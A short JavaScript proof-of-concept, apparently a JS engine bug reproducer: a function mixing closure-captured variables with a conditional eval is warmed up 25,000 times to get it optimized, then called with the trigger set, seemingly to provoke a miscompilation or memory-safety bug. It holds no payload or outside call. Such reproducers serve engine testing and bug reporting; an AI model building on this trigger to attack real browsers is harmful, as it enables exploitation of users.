function poc(trigger) {
    let a = 1.1;
    let b = {
        p: 2.2
    };

    (() => {
        a;
        b;
    })();

    let code = '';
    if (trigger) {
        code = '{ let c = 3.3; } a = 4.4;';
    }

    eval(code);

    return b;
}

for (let i = 0; i < 25000; i++) {
    poc(false);
}

poc(true);